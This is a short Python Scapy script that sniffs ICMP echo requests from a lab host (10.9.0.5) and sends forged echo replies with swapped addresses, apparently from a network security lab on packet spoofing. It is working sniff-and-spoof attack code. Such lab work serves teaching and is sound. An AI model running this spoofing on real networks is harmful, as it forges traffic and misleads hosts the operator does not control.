#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:
        print("Original Packet...............")
        print("Source IP: ", pkt[IP].src)
        print("Destination IP: ", pkt[IP].dst)

        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        ip.ttl = 99
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        
        if pkt.haslayer(Raw):
            data = pkt[Raw].load
            newpkt = ip/icmp/data
        else:
            newpkt = ip/icmp
            
        print("Spoofed Packet..........")
        print("Source IP: ", newpkt[IP].src)
        print("Destination IP: ", newpkt[IP].dst)
        
        send(newpkt, verbose=0)

# interfaces where to sniff packets
ifaces = ['enp0s3', 'br-9bff7edb888c', 'lo']

filter_str = "icmp and src host 10.9.0.5"

# Sniff the packets
# prn specifies the function spoof_pkt to be run on each packet that matches the filter
sniff(iface = ifaces, filter = filter_str, prn=spoof_pkt)
